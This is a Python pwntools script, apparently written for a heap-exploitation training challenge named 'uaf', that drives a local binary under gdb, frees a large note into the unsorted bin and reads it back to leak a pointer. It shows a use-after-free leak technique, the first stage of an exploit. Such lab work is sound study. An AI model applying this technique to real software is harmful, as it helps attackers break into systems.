from pwn import *
from pwnlib.util.packing import *
import re
import struct
import math
import warnings
import time as t
warnings.filterwarnings("ignore") # Had to kill those pwntools ascii warnings...they're annoying

def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

BINARY_FILE = "/home/jnu/Desktop/7-Week/uaf/challenge/chal"
p = process('/bin/bash')
cmd = "gdb " + BINARY_FILE + " -q"
p.sendline(cmd)

p.sendline("break menu")
print(cleanLine(p.recvline()))
p.sendline("r")
p.recv()
p.clean(timeout=0.05)
p.sendline("c")
p.recv()
p.clean(timeout=0.05)

t.sleep(0.5)

# Add Note 0 - Our big note
p.sendline("1")
print("Adding note 0")
print(cleanLine(p.recvline()))
p.sendline("1033")
p.recv()
p.clean(timeout=0.05)
p.sendline("c")
print(cleanLine(p.recvline()))
p.recv()
p.clean(timeout=0.05)

t.sleep(0.5)

'''

# Quick edit so I can see something
p.sendline("3")
print("Writing to note 0")
print(cleanLine(p.recvline()))
p.sendline("4")
print(cleanLine(p.recvline()))
dat = p64(0xDEADBEEF)
p.sendline(dat)
p.sendline("c")
p.recv()
p.clean(timeout=0.05)

t.sleep(0.5)
'''

# Add Note 1 - Our border note?
p.sendline("1")
print("Adding note 1 (Border allocation)")
print(cleanLine(p.recvline()))
p.sendline("24")
p.recv()
p.clean(timeout=0.05)
p.sendline("c")
print(cleanLine(p.recvline()))
p.recv()
p.clean(timeout=0.05)

t.sleep(0.5)

# Free note 0 so it will fall into unsorted
p.sendline("2")
print("Deleting note 0")
print(cleanLine(p.recvline()))
p.sendline("0")
p.recv()
p.clean(timeout=0.05)
p.sendline("c")
print(cleanLine(p.recvline()))
p.recv()
p.clean(timeout=0.05)

t.sleep(0.5)

# Read note 0
p.sendline("4")
#p.interactive()
print("Reading note 0")
print(cleanLine(p.recvline()))
p.sendline("0")
print(cleanLine(p.recvline()))

l = p.recv(numb=8)
#print(l)
#print(l.hex())
lk = hex(unpack(l, 'all', endian='little', sign=False))
print(lk)

p.interactive()